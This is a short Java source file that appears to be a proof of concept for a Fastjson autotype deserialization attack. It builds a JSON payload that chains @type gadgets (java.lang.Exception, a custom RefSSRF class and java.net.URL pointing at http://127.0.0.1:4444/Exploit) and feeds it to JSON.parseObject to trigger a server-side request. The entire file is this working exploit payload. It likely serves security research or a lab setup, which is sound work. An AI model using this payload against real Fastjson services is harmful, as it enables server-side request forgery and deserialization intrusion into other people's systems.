package org.heptagram.fastjson;
import com.alibaba.fastjson.JSON;

public class RefSSRFMain {
    public static void main(String[] args) {
        String payload ="{\n" +
                "  \"@type\": \"java.lang.Exception\",\n" +
                "  \"@type\": \"org.heptagram.fastjson.RefSSRF\",\n" +
                "  \"dataSource\": {\n" +
                "    \"@type\": \"java.net.URL\",\n" +
                "    \"val\": \"http://127.0.0.1:4444/Exploit\"\n" +
                "  }\n" +
                "}";
        JSON.parseObject(payload);
    }
}
